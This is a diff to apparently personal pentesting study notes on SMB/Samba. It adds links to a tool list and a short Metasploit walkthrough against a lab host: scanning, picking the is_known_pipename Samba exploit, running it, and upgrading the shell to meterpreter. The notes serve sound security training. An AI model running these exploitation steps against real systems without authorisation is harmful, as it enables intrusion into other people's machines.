@@ -4,14 +4,14 @@
 	3. Usage
 	4. Related Services
 2. [Tools](#Tools)
-	1. nmap
+	1. [nmap](#nmap)
 	2. smbmap
 	3. nmblookup
 	4.  smbclient
 	5. rpcclient
 	6. enum4linux
-	7. msfconsole
-	8. hydra
+	7. [msfconsole](#msfconsole)
+	8. [hydra](#hydra)
 	9. psexec.py
 	10. eternal blue
 
@@ -194,6 +194,17 @@ Metasploit framework
 	- payload options - meterpreter
 		- set LHOST
 		- set LPORT
+
+### Example
+1. `db_nmap -sS -sV -O demo.ine.local` : scan target
+2. `search type:exploit name:samba` : search for module
+3. `use exploit/linux/samba/is_known_pipename`
+	1. `set rhost targetIP` : set target
+	2. `check` : will check if vulnerable
+	3. `run` : exploit
+	4. ctrl-z : background process
+4. `sessions -u 1` : upgrade sessions 1
+5. or manually with `multi/manage/shell_to_meterpreter`
 
 ---
 
